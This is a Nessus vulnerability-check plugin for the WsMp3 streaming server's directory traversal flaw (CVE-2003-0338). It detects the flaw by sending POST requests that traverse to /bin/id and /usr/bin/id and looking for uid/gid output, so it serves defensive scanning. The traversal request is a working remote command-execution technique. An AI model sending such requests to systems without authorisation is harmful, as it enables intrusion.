#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
 script_id(11645);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2003-0338");
 script_xref(name:"OSVDB", value:"8440");

 script_name(english:"WsMp3 Daemon (WsMp3d) HTTP Traversal Arbitrary File Execution/Access");
 script_summary(english:"Attempts to execute /bin/id");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote host is running a MP3 streaming web server with a\n",
     "directory traversal vulnerbaility."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is using wsmp3d, a MP3 streaming web server.\n\n",
     "There is a flaw in this server which allows anyone to execute arbitrary\n",
     "commands and read arbitrary files with the privileges this server is\n",
     "running with."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0077.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"There is no known solution at this time."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8000);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:8000);
foreach port (ports)
{
 if ( ! get_http_banner(port:port) ) continue;

 req = http_get(item:"/cmd_ver", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( "WsMp3" >< res ) 
 {
 dirs = get_kb_list(string("www/", port, "/content/directories"));
 if(!isnull(dirs))
 {
  dirs = make_list(dirs);
  dirs = list_uniq(make_list(dirs[0], cgi_dirs()));
 }
 else
  dirs = cgi_dirs();

foreach d (dirs)
{
 req = string("POST ", d, "/../../../../../../../../../../../../bin/id HTTP/1.0\r\n\r\n");
 soc = open_sock_tcp(port);
 if(!soc)break;
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 close(soc);
 if("uid=" >< r  && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r) )
 {
  security_hole(port);
  exit(0);
 }
 if("id: Not implemented" >< r)
 {
  req = string("POST ", d, "/../../../../../../../../../../../../usr/bin/id HTTP/1.0\r\n\r\n");
  soc = open_sock_tcp(port);
  if(!soc)break;
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if("uid=" >< r && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:r) )
  {
  security_hole(port);
  exit(0);
  }
  }
 }
}
}
